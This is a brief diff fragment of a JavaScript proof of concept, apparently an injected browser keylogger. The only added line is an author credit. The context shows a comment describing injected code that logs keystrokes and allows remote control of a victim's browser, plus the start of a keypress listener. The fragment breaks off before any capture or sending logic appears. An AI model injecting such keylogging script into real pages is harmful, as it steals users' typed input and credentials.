@@ -1,3 +1,4 @@
+// Coded by: QyFashae
 <script>
 // In this PoC the attacker injects code that logs keystrokes and enables remote control of the victim's browser.
     document.addEventListener('keypress', function(event) {
